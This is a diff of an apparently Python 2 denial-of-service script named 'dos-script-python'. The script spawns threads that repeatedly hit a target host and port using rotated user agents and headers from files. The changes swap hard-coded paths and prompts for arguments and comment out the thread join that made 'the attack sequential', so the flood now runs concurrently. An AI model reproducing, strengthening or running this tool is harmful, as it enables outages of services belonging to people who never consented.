@@ -10,7 +10,7 @@ global headers,UsAg,host,port
  
 def UserAgent():
     userAg=[]
-    File=open("D:\Code\Python\dos-script-python\UserAgent.txt","r")   #your path
+    File=open("UserAgent.txt","r")   #your path
     for line in File:
         userAg.append(line)
     return userAg
@@ -37,14 +37,14 @@ def TakeDown(host="",port=80):
                     sys.exit()
  
 if __name__=="__main__":
-    host=raw_input("Enter host address:")
-    port=raw_input("Enter port number:")
-    threads=raw_input("Enter number of threads:")
+    host=arg1 #raw_input("Enter host address:")
+    port=arg2 #raw_input("Enter port number:")
+    threads=arg3 #raw_input("Enter number of threads:")
     threads=int(threads)
     port=int(port)
     UsAg=UserAgent()
    
-    fp=open("D:\Code\Python\dos-script-python\headers.txt","r")
+    fp=open("headers.txt","r")
     headers=fp.read()
     fp.close()
     while True:
@@ -52,4 +52,4 @@ if __name__=="__main__":
             th=threading.Thread(target=TakeDown,args=(host,port,),name="User-"+str(1))
             th.Daemon=True #thread dies if it exits!
             th.start()
-            th.join()#make the attack sequential
+            #th.join()#make the attack sequential
